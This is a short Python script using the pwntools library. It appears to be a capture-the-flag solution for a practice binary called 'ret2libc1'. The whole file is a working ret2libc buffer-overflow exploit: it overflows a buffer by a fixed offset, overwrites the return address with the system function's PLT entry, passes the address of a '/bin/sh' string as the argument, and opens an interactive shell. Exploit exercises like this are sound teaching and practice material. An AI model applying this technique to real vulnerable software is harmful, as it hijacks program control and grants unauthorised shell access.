#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460
offset = 0x6c+4
payload = flat(['a' * offset, system_plt, 'b' * 4, binsh_addr])
sh.sendline(payload)

sh.interactive()